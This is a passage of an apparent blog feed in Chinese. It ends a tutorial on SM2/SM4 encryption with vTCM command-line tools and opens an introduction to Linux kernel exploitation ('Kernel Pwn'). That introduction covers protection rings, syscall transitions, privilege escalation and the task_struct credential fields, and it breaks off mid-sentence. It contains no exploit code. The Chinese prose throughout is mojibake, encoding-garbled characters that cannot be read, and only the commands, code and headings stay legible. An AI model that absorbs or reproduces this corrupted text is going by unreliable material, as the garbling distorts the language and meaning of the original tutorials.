class="hljs-number">1</span>:<span class="hljs-variable">$keyHandle</span> <br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$smkHandle</span> <br><span class="hljs-keyword">in</span>: apcreate -it <span class="hljs-number">01</span> -iv <span class="hljs-variable">$keyHandle</span> -pwd sm2 <br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$keyAuthHandle</span> <br><span class="hljs-keyword">in</span>: sm2decrypt -ik <span class="hljs-variable">$keyHandle</span> -is <span class="hljs-variable">$keyAuthHandle</span> -rf sm2crypt<span class="hljs-selector-class">.dat</span>  -wf <br>sm2decrypt<span class="hljs-selector-class">.dat</span> <br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$keyAuthHandle</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ•°æ®æ–‡ä»¶sm2test.datï¼Œæ­¤å¤„æˆ‘å†™å…¥æ•°æ®vTCM_is_goodï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207162537053.png" alt="image-20241207162537053"></p><p>è¾“å…¥å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm2encrypt -kf sm2.key -rf sm2test.dat -wf sm2crypt.dat<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207162709694.png" alt="image-20241207162709694"></p><p>ä½¿ç”¨smkå¥æŸ„ï¼ˆb90e432ï¼‰è¾“å…¥å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">loadkey -ih b90e432 -kf sm2.key <br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ä¼šè¿”å›sm2å¯†é’¥çš„å¥æŸ„80bd5ebeï¼Œä¹‹åè¯·è‡ªè¡Œæ›¿æ¢æœ‰å…³80bd5ebeçš„åœ°æ–¹ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207163509456.png" alt="image-20241207163509456"></p><p>ä½¿ç”¨å¯†é’¥å¥æŸ„ï¼Œè·å–å¯†é’¥æˆæƒå¥æŸ„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apcreate -it 01 -iv 80bd5ebe -pwd sm2<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207163856377.png" alt="image-20241207163856377"></p><p>æ­¤å¤„æˆ‘çš„å¥æŸ„ä¸º79d4a365ï¼Œä¹‹åè¯·è‡ªè¡Œæ›¿æ¢æœ‰å…³79d4a365çš„åœ°æ–¹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm2decrypt -ik 80bd5ebe -is 79d4a365 -rf sm2crypt.dat  -wf sm2decrypt.dat<br></code></pre></td></tr></table></figure><p>æ‰“å¼€sm2decrypt.datæ–‡ä»¶ï¼Œå‘ç°è§£å¯†æˆåŠŸï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207165332904.png" alt="image-20241207165332904"></p><p>å¯¹ç§°å¯†é’¥åŠ è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">in</span>: apcreate -it <span class="hljs-number">04</span> -pwd sss<br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$smkHandle</span><br><span class="hljs-keyword">in</span>: loadkey -ih <span class="hljs-variable">$smkHandle</span> -kf sm4<span class="hljs-selector-class">.key</span><br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$keyHandle</span><br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$smkHandle</span><br><span class="hljs-keyword">in</span>: apcreate -it <span class="hljs-number">01</span> -iv <span class="hljs-variable">$keyHandle</span> -pwd sm4<br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$keyAuthHandle</span>  <br><span class="hljs-keyword">in</span>: sm4encrypt -ikh <span class="hljs-variable">$keyHandle</span> -idh <span class="hljs-variable">$keyAuthHandle</span> -rf sm4test<span class="hljs-selector-class">.dat</span> -wf sm4crypt<span class="hljs-selector-class">.dat</span><br><span class="hljs-keyword">in</span>: sm4decrypt -ikh <span class="hljs-variable">$keyHandle</span> -idh <span class="hljs-variable">$keyAuthHandle</span> -rf sm4crypt<span class="hljs-selector-class">.dat</span> -wf sm4decrypt<span class="hljs-selector-class">.dat</span><br><span class="hljs-keyword">in</span>: apterminate -ih <span class="hljs-variable">$keyAuthHandle</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¸€æ­¥æ­¥æ¥çœ‹å¯¹åº”çš„ç»“æœï¼Œé¦–å…ˆsmkå¥æŸ„æˆ‘ä»¬å·²ç»è·å–åˆ°äº†ï¼Œé‚£ä¹ˆç›´æ¥è·å–å¯†é’¥å¥æŸ„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">loadkey -ih b90e432 -kf sm4.key<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207170828244.png" alt="image-20241207170828244"></p><p>æˆ‘çš„å¯†é’¥å¥æŸ„ä¸º7fee8800ï¼Œè¯·è¯»è€…è‡ªè¡Œåœ¨å¯¹åº”çš„åœ°æ–¹æ›¿æ¢æˆè‡ªå·±çš„å¥æŸ„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">apterminate -ih b90e432<br>apcreate -it 01 -iv 7fee8800 -pwd sm4<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶è¿”å›å¯†é’¥æˆæƒå¥æŸ„ï¼Œä¸º4f5e17bfã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171131431.png" alt="image-20241207171131431"></p><p>åˆ°è¿™ä¸€æ­¥æˆ‘ä»¬å…ˆåœ¨./vtcm_utilsæ–‡ä»¶å¤¹ä¸‹å»ºç«‹sm4test.datæ–‡ä»¶ï¼Œå¹¶å†™å…¥æ•°æ®ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171505646.png" alt="image-20241207171505646"></p><p>ä½¿ç”¨sm4è¿›è¡ŒåŠ å¯†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm4encrypt -ikh 7fee8800 -idh 4f5e17bf -rf sm4test.dat -wf sm4crypt.dat<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171559386.png" alt="image-20241207171559386"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171543801.png" alt="image-20241207171543801"></p><p>æ¥ä¸‹æ¥è¿›è¡Œè§£å¯†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sm4decrypt -ikh 7fee8800 -idh 4f5e17bf -rf sm4crypt.dat -wf sm4decrypt.dat<br></code></pre></td></tr></table></figure><p>è§£å¯†æˆåŠŸï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171910659.png" alt="image-20241207171910659"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207171926293.png" alt="image-20241207171926293"></p><h3 id="PIKç”³è¯·è¿‡ç¨‹ğŸ•Šï¸">PIKç”³è¯·è¿‡ç¨‹ğŸ•Šï¸</h3>]]></content>
    
    
    
    <tags>
      
      <tag>vTPM</tag>
      
      <tag>vTCM</tag>
      
      <tag>swtpm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç›´åšè‡ªæ•‘ï¼Œä»é›¶å¼€å§‹çš„Kernel Pwnå…¥é—¨</title>
    <link href="/2025/08/25/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Kernel-Pwn%E5%85%A5%E9%97%A8/"/>
    <url>/2025/08/25/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Kernel-Pwn%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼€å§‹ä¹‹å‰">å¼€å§‹ä¹‹å‰</h1><p>ç¬”è€…æ˜¯åŒéæœ¬ï¼Œæœ¬ç§‘å‰ä¸¤å¹´å…¶å®æŒºæ‘†çš„ï¼Œæ‰€ä»¥ä¹Ÿæ²¡å•¥ç§‘ç ”æˆæœï¼Œå‡ç»©ä¹Ÿä¸å¤ªå¥½ï¼Œå°½ç®¡è¿‡ç¨‹å¾ˆæ›²æŠ˜ä½†æ˜¯æœ€åè¿˜æ˜¯ä¿ç ”æˆåŠŸã€‚ç¬”è€…å—å®¶åº­å½±å“æœ€å¼€å§‹å¯¹ç›´åšçš„çœ‹æ³•è¿˜ä¸é”™ï¼Œæ‰€ä»¥æ¨å…æ—¶ç¬”è€…ä¹Ÿç»å¸¸å¥—ç“·ç›´åšï¼Œæœ€åæ¥è¿™æ‰€å­¦æ ¡ç›´åšæ˜¯å› ä¸ºç¦»å®¶è¿‘ï¼Œæ²¡æƒ³åˆ°è¿™ç«Ÿç„¶æ˜¯å™©æ¢¦çš„å¼€å§‹ã€‚</p><p>è¯´å®è¯ï¼Œç›´åšåˆ°ç°åœ¨æ„Ÿè§‰åˆ°çš„åªæœ‰ç—›è‹¦ï¼Œè¯¾é¢˜ç»„æ¯«æ— è¿›å±•ã€å¯¼å¸ˆæ¯«æ— å®è´¨æ€§å¸®åŠ©åªä¼šä¸åœpushè¿›åº¦ä»¥åŠç»„å†…è¿˜éœ€è¦åšæ¨ªå‘éƒ½è®©æˆ‘æ— æ¯”å¤±è½ï¼Œä¸è¯»åšä¹‹å‰çš„ç•…æƒ³å®Œå…¨ä¸åŒã€‚åœ¨è¿™æå‰è¿›ç»„çš„ä¸€å¹´ï¼Œå­¦ä¹ çš„ä¸œè¥¿éƒ½æ˜¯æµ…å°è¾„æ­¢ï¼Œå› ä¸ºä¹‹å‰ä¸€ç›´æ ¹æ®è¯¾é¢˜ç»„çš„éœ€è¦æ¥å­¦ä¹ çš„ï¼Œä½†æ˜¯è¯¾é¢˜ç»„æ ¹æœ¬æ²¡æœ‰ä¸€ä¸ªç¡®åˆ‡çš„æ–¹å‘ï¼Œå­¦çš„ä¸œè¥¿ä¹Ÿéƒ½ä¸ç¡®å®šèƒ½ä¸èƒ½ç”¨ä¸Šï¼Œå› æ­¤ç ”ç©¶çš„å¯¹è±¡ä¹Ÿä¸€ç›´åœ¨æ¢ï¼Œå°±è¿™æ ·ç™½ç™½è€½è¯¯äº†ä¸€å¹´æ—¶é—´ã€‚</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ç¬”è€…ä¸€åº¦äº§ç”Ÿææ¡¶è·‘è·¯çš„æƒ³æ³•ï¼Œä¸è¿‡æœ€åè¿˜æ˜¯æ”¾å¼ƒäº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºç¬”è€…æ€§æ ¼æœ¬èº«å°±ä¸å¤Ÿå‹‡æ•¢ï¼Œä¹Ÿå¯èƒ½æ˜¯çœ‹äº†ç½‘ä¸Šä¸€äº›ç›´åšçš„å¿ƒå¾—å‘ç°å¤§å®¶éƒ½å·®ä¸å¤šï¼ˆå›½å†…èµ·ç éƒ½å·®ä¸å¤šï¼‰ã€‚è¿™æœŸé—´ç¬”è€…çœ‹åˆ°å¾ˆåº”æ™¯çš„ä¸€å¥è¯ï¼Œâ€œè¯»åšå°±åƒæ˜¯åœ¨é’æ¥¼å½“å¦“å¥³ï¼Œä½ éœ€è¦åšçš„ä¸æ˜¯äº‰åšå¤´ç‰Œï¼Œè€Œæ˜¯å°½å¿«èµèº«â€ã€‚é‚£æ—¶å€™æˆ‘å¤§æ¦‚æ˜ç™½äº†ï¼Œæ—¢ç„¶ç»„é‡Œå’Œå¯¼å¸ˆéƒ½é ä¸ä½ï¼Œé‚£å°±é è‡ªå·±å§ï¼Œåšè‡ªå·±æƒ³åšçš„ï¼Œç»„å†…çš„ä¸œè¥¿å°±ä¸ç®¡äº†ï¼Œå¯¼å¸ˆéª‚å½’éª‚ï¼Œè‡ªå·±åšå½’åšï¼Œåªè¦è¾¾åˆ°æ¯•ä¸šæ¡ä»¶è‡ªç„¶ä¸ä¼šå¡æ¯•ä¸šã€‚</p><p>æƒ³é€šä¹‹åç¬”è€…å°±é‡Šç„¶äº†ï¼Œç»„é‡Œçš„æ–¹å‘éƒ½æ²¡å®šæˆ‘ä¹Ÿä¸æƒ³å¸®å¿™äº†ï¼Œæƒ³åˆ°ä¹‹å‰å¾ˆæ—©å°±æƒ³ç ”ç©¶çš„å†…æ ¸å®‰å…¨ï¼Œé‚æ¥å­¦ä¹ ï¼Œäº‰å–åœ¨æˆ‘è‡ªå·±æ„Ÿå…´è¶£çš„æ–¹å‘åšå‡ºç‚¹æˆæœå‡ºæ¥ã€‚è™½ç„¶ä»¥è¿™ä¸ªæ–¹å‘æ¯•ä¸šç¡®å®å¾ˆéš¾ï¼Œä½†æ˜¯èµ·ç æ˜¯æˆ‘æ„¿æ„ä¸€ç›´åšä¸‹å»çš„ä¸”æ˜¯ä¸€ä¸ªæ˜ç¡®çš„ç›®æ ‡ã€‚</p><p>æœ‰æ„Ÿè€Œå‘ï¼ŒåºŸè¯å°±è¯´åˆ°è¿™ä¹ˆå¤šï¼Œç”±äºç¬”è€…<s>å¤ªèœ</s>å¯èƒ½å­˜åœ¨ä¸€äº›æœ¯è¯­ä½¿ç”¨ä¸æ ‡å‡†ï¼Œå¦‚æœæœ‰è¯»è€…å‘ç°é”™è¯¯è¯·ä¸åèµæ•™ï¼ŒåŒæ—¶ç¬”è€…å€Ÿé‰´äº†å¾ˆå¤šctf-wikiå’Œå…¶ä»–å¤§ä½¬çš„å†…å®¹ï¼Œéƒ½æ ‡æ³¨åœ¨æ–‡åäº†ï¼Œå¦‚æœ‰ä¾µæƒè¯·è”ç³»yzsandw@gmail.comã€‚</p><h1 id="Operation-System-Kernel">Operation System Kernel</h1><p>æ“ä½œç³»ç»Ÿå†…æ ¸ï¼ˆOperation System Kernelï¼‰æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§è½¯ä»¶ï¼Œå¯ä»¥çœ‹ä½œæ˜¯æ™®é€šåº”ç”¨ç¨‹å¼ä¸ç¡¬ä»¶ä¹‹é—´çš„ä¸€å±‚ä¸­é—´å±‚ï¼Œå…¶ä¸»è¦ä½œç”¨ä¾¿æ˜¯è°ƒåº¦ç³»ç»Ÿèµ„æºã€æ§åˆ¶ IO è®¾å¤‡ã€æ“ä½œç½‘ç»œä¸æ–‡ä»¶ç³»ç»Ÿç­‰ï¼Œå¹¶ä¸ºä¸Šå±‚åº”ç”¨æä¾›ä¾¿æ·ã€æŠ½è±¡çš„åº”ç”¨æ¥å£ã€‚</p><p>æ“ä½œç³»ç»Ÿå†…æ ¸å…¶å®æ˜¯ä¸€ä¸ªæŠ½è±¡å‡ºæ¥çš„æ¦‚å¿µï¼Œå®é™…ä¸Šå†…æ ¸å’Œæ™®é€šè¿›ç¨‹æ˜¯ä¸€æ ·åœ¨å†…å­˜ä¸­å¹¶ä¸”ç”±cpuæ‰§è¡Œï¼Œä¸åŒä¹‹å¤„åœ¨äºcpuæ‰§è¡Œå†…æ ¸ä»£ç æ—¶é€šå¸¸å¤„äºé«˜æƒé™ï¼Œæ‹¥æœ‰å®Œå…¨çš„ç¡¬ä»¶è®¿é—®èƒ½åŠ›ï¼Œè€Œç”¨æˆ·ä»£ç å¾€å¾€æ‰§è¡Œåœ¨ä½æƒé™ç¯å¢ƒã€‚</p><p>ä¸åŒçš„æƒé™çŠ¶æ€å…¶å®æ˜¯é€šè¿‡ç¡¬ä»¶æ¥å®ç°çš„ï¼Œç¡¬ä»¶æä¾›çš„<strong>åˆ†çº§ä¿æŠ¤ç¯</strong>å®ç°è¿™ç§åŒºåˆ†ã€‚</p><h1 id="hierarchical-protection-domains">hierarchical protection domains</h1><p><strong>åˆ†çº§ä¿æŠ¤åŸŸ</strong>ï¼ˆhierarchical protection domainsåˆè¢«ç§°ä½œä¿æŠ¤ç¯ï¼Œç®€ç§° Rings ï¼Œæ˜¯ä¸€ç§å°†è®¡ç®—æœºä¸åŒçš„èµ„æºåˆ’åˆ†è‡³ä¸åŒæƒé™çš„æ¨¡å‹ã€‚</p><p>åœ¨ä¸€äº›ç¡¬ä»¶æˆ–è€…å¾®ä»£ç çº§åˆ«ä¸Šæä¾›ä¸åŒç‰¹æƒæ€æ¨¡å¼çš„ CPU æ¶æ„ä¸Šï¼Œä¿æŠ¤ç¯é€šå¸¸éƒ½æ˜¯ç¡¬ä»¶å¼ºåˆ¶çš„ã€‚Rings æ˜¯ä»æœ€é«˜ç‰¹æƒçº§ï¼ˆé€šå¸¸è¢«å«ä½œ 0 çº§ï¼‰åˆ°æœ€ä½ç‰¹æƒçº§ï¼ˆé€šå¸¸å¯¹åº”æœ€å¤§çš„æ•°å­—ï¼‰æ’åˆ—çš„ã€‚</p><p>Intel çš„ CPU å°†æƒé™åˆ†ä¸ºå››ä¸ªç­‰çº§ï¼šRing0ã€Ring1ã€Ring2ã€Ring3ï¼Œæƒé™ç­‰çº§ä¾æ¬¡é™ä½ï¼Œç°ä»£æ“ä½œç³»ç»Ÿæ¨¡å‹ä¸­æˆ‘ä»¬é€šå¸¸åªä¼šä½¿ç”¨ ring0 å’Œ ring3ï¼Œå¯¹åº”æ“ä½œç³»ç»Ÿå†…æ ¸ä¸ç”¨æˆ·è¿›ç¨‹ï¼Œå³ CPU åœ¨æ‰§è¡Œç”¨æˆ·è¿›ç¨‹ä»£ç æ—¶å¤„åœ¨ ring3 ä¸‹ã€‚</p><ul><li><strong>Ring 0</strong>ï¼šæƒé™æœ€é«˜ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸è¿è¡Œåœ¨è¿™é‡Œï¼Œå¯ä»¥ç›´æ¥è®¿é—®ç¡¬ä»¶ã€ç®¡ç†å†…å­˜ã€åˆ‡æ¢è¿›ç¨‹ç­‰ã€‚</li><li><strong>Ring 1/2</strong>ï¼šè®¾è®¡ä¸Šæ˜¯ç»™é©±åŠ¨ç¨‹åºæˆ–ä¸­é—´å±‚ä½¿ç”¨çš„ï¼Œä½†åœ¨ç°ä»£æ“ä½œç³»ç»Ÿä¸­å‡ ä¹ä¸ç”¨ï¼Œå¸¸è¢«å¿½ç•¥ã€‚</li><li><strong>Ring 3</strong>ï¼šæƒé™æœ€ä½ï¼Œç”¨æˆ·ç¨‹åºè¿è¡Œåœ¨è¿™é‡Œï¼Œä¸èƒ½ç›´æ¥è®¿é—®ç¡¬ä»¶ï¼Œåªèƒ½é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ã€‚</li></ul><p>è¿™æ ·åˆ†çº§çš„ç›®çš„æ˜¯ä¸ºäº†<strong>ä¿æŠ¤å†…æ ¸å’Œå…³é”®èµ„æºä¸è¢«æ™®é€šç¨‹åºç›´æ¥ç ´å</strong>ã€‚</p><p>åœ¨å…¶ä»–æ¶æ„ï¼ˆæ¯”å¦‚ ARMï¼‰é‡Œï¼Œä¹Ÿæœ‰ç±»ä¼¼çš„æœºåˆ¶ï¼Œä¸è¿‡å«åš <strong>å¼‚å¸¸ç­‰çº§ (Exception Levels, EL0â€“EL3)</strong>ï¼ŒEL0 æ˜¯ç”¨æˆ·ç¨‹åºï¼ŒEL1 æ˜¯å†…æ ¸ï¼ŒEL2 ç”¨äºè™šæ‹ŸåŒ–ï¼ŒEL3 ç”¨äºå®‰å…¨ç›‘æ§ï¼ˆTrustZoneï¼‰ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/Priv_rings.svg.png" alt="Priv_rings.svg"></p><p>ç°åœ¨æˆ‘ä»¬ç»™ã€ç”¨æˆ·æ€ã€‘ä¸ã€å†…æ ¸æ€ã€‘è¿™ä¸¤ä¸ªæ¦‚å¿µä¸‹å®šä¹‰ï¼š</p><ul><li>ç”¨æˆ·æ€ï¼šCPU è¿è¡Œåœ¨ ring3 + ç”¨æˆ·è¿›ç¨‹è¿è¡Œç¯å¢ƒä¸Šä¸‹æ–‡ã€‚</li><li>å†…æ ¸æ€ï¼šCPU è¿è¡Œåœ¨ ring0 + å†…æ ¸ä»£ç è¿è¡Œç¯å¢ƒä¸Šä¸‹æ–‡ã€‚</li></ul><h1 id="çŠ¶æ€åˆ‡æ¢">çŠ¶æ€åˆ‡æ¢</h1><p>æ™®é€šåº”ç”¨ç¨‹åºè¿è¡Œæ—¶å¤„åœ¨ç”¨æˆ·æ€ï¼Œåªèƒ½æ‰§è¡Œå—é™æŒ‡ä»¤ã€‚å¦‚æœç¨‹åºéœ€è¦è®¿é—®ç¡¬ä»¶æˆ–æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼ˆæ¯”å¦‚è¯»å†™æ–‡ä»¶ã€åˆ†é…å†…å­˜ã€å‘é€ç½‘ç»œè¯·æ±‚ï¼‰ï¼Œå°±å¿…é¡»é€šè¿‡<strong>ç³»ç»Ÿè°ƒç”¨</strong>æˆ–<strong>å¼‚å¸¸/ä¸­æ–­</strong>çš„æ–¹å¼è¿›å…¥å†…æ ¸ã€‚CPU æ¥æ”¶åˆ°ç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼ˆå¦‚ <code>int 0x80</code>ã€<code>syscall</code>ã€<code>svc</code> ç­‰ï¼‰åï¼Œä¼šåˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œè·³è½¬åˆ°å†…æ ¸å®šä¹‰çš„å…¥å£åœ°å€æ‰§è¡Œã€‚å†…æ ¸å®Œæˆæ“ä½œåï¼Œå†é€šè¿‡ <code>iret</code> æˆ– <code>sysret</code> ä¹‹ç±»çš„æŒ‡ä»¤è¿”å›ç”¨æˆ·æ€ï¼Œæ¢å¤ç¨‹åºç»§ç»­è¿è¡Œã€‚</p><h2 id="user-space-to-kernel-space-ç³»ç»Ÿè°ƒç”¨">user space to kernel space(ç³»ç»Ÿè°ƒç”¨)</h2><p>å½“å‘ç”Ÿ <code>ç³»ç»Ÿè°ƒç”¨</code>ï¼Œ<code>äº§ç”Ÿå¼‚å¸¸</code>ï¼Œ<code>å¤–è®¾äº§ç”Ÿä¸­æ–­</code> ç­‰äº‹ä»¶æ—¶ï¼Œä¼šå‘ç”Ÿç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ï¼Œè¿›å…¥åˆ°å†…æ ¸ç›¸å¯¹åº”çš„å¤„ç†ç¨‹åºä¸­è¿›è¡Œå¤„ç†ã€‚</p><p>ç³»ç»Ÿè°ƒç”¨æ˜¯å†…æ ¸ä¸ç”¨æˆ·é€šä¿¡çš„ç›´æ¥æ¥å£ï¼Œå› æ­¤æˆ‘ä»¬ä¸»è¦å…³æ³¨ç”¨æˆ·ç©ºé—´æ¯”è¾ƒå¸¸ç”¨çš„ç³»ç»Ÿè°ƒç”¨è¿™ä¸€è¡Œä¸ºï¼Œå…¶å…·ä½“çš„è¿‡ç¨‹ä¸ºï¼š</p><blockquote><p>æ³¨ï¼šè¿™éƒ¨åˆ†ä»£ç éƒ½æ˜¯åœ¨å†…æ ¸æ€ä¸­æ‰§è¡Œçš„</p></blockquote><ol><li>é€šè¿‡ <code>swapgs</code> åˆ‡æ¢ GS æ®µå¯„å­˜å™¨ï¼Œå°† GS å¯„å­˜å™¨å€¼å’Œä¸€ä¸ªç‰¹å®šä½ç½®çš„å€¼è¿›è¡Œäº¤æ¢ï¼Œç›®çš„æ˜¯ä¿å­˜ GS å€¼ï¼ŒåŒæ—¶å°†è¯¥ä½ç½®çš„å€¼ä½œä¸ºå†…æ ¸æ‰§è¡Œæ—¶çš„ GS å€¼ä½¿ç”¨ã€‚</li><li>å°†å½“å‰æ ˆé¡¶ï¼ˆç”¨æˆ·ç©ºé—´æ ˆé¡¶ï¼‰è®°å½•åœ¨ CPU ç‹¬å å˜é‡åŒºåŸŸé‡Œï¼Œå°† CPU ç‹¬å åŒºåŸŸé‡Œè®°å½•çš„å†…æ ¸æ ˆé¡¶æ”¾å…¥ rsp/espã€‚</li><li>é€šè¿‡ push ä¿å­˜å„å¯„å­˜å™¨å€¼</li><li>é€šè¿‡æ±‡ç¼–æŒ‡ä»¤åˆ¤æ–­æ˜¯å¦ä¸º <code>x32_abi</code>ã€‚</li><li>é€šè¿‡ç³»ç»Ÿè°ƒç”¨å·ï¼Œè·³åˆ°å…¨å±€å˜é‡ <code>sys_call_table</code> ç›¸åº”ä½ç½®ç»§ç»­æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ã€‚</li></ol><h2 id="kernel-space-to-user-space">kernel space to user space</h2><p>é€€å‡ºæ—¶ï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>é€šè¿‡ <code>swapgs</code> æ¢å¤ GS å€¼ã€‚</li><li>é€šè¿‡ <code>sysretq</code> æˆ–è€… <code>iretq</code> æ¢å¤åˆ°ç”¨æˆ·æ§ä»¶ç»§ç»­æ‰§è¡Œã€‚å¦‚æœä½¿ç”¨ <code>iretq</code> è¿˜éœ€è¦ç»™å‡ºç”¨æˆ·ç©ºé—´çš„ä¸€äº›ä¿¡æ¯ï¼ˆCS, eflags/rflags, esp/rsp ç­‰ï¼‰ã€‚</li></ol><h1 id="å†…æ ¸æ¼æ´åˆ©ç”¨çš„ç‰¹ç‚¹">å†…æ ¸æ¼æ´åˆ©ç”¨çš„ç‰¹ç‚¹</h1><p>åœ¨ç”¨æˆ·æ€æ¼æ´åˆ©ç”¨æ—¶ï¼Œåˆ©ç”¨çš„ä¸»è¦æ˜¯è¿›ç¨‹æœ¬èº«çš„æ¼æ´ä»è€Œè·å–ä¸»æœºçš„æ§åˆ¶æƒã€‚è€Œåœ¨å†…æ ¸æ€Pwnæ—¶ä¸»è¦ä¼šä»¥â€œæƒé™æå‡â€ä½œä¸ºä¸»è¦ç›®æ ‡ï¼Œå…¶å‰æçœ‹ä¸€çœ‹ä¸ºåœ¨æ”»å‡»è€…å·²ç»é€šè¿‡æŸç§æ–¹å¼å…¥ä¾µäº†ç›®æ ‡æœºå™¨çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…åˆ©ç”¨å†…æ ¸æ¼æ´è¿›ä¸€æ­¥æå‡æƒé™ã€‚å› æ­¤â€œå¦‚ä½•æå‡è¿›ç¨‹æƒé™â€æˆä¸ºä¸€ä¸ªé—®é¢˜ï¼Œå…¶ä¸­ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“è¿›ç¨‹æƒé™æ˜¯ä»¥ä»€ä¹ˆæ ·çš„å½¢å¼å­˜åœ¨çš„ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ªè¿›ç¨‹çš„ç»“æ„æ˜¯æ€ä¹ˆæ ·çš„ï¼Œåœ¨å†…æ ¸æºç çš„<code>include/linux/sched.h</code>ä¸­å®šä¹‰äº†è¿›ç¨‹ç»“æ„ä½“<code>task_struct</code>ï¼Œå…·ä½“ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250826142629323.png" alt="image-20250826142629323"></p><h2 id="è¿›ç¨‹æƒé™å‡­è¯-credential">è¿›ç¨‹æƒé™å‡­è¯(credential)</h2><p>å¯ä»¥åœ¨<code>task_struct</code>çš„æºç ä¸­çœ‹åˆ°è¿›ç¨‹æƒé™å‡­è¯<code>cred</code>çš„ç›¸å…³å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process credentials: */</span><br><br><span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">ptracer_cred</span>;</span><br><br><span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">real_cred</span>;</span><br><br><span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>        *<span class="hljs-title">cred</span>;</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ª cred 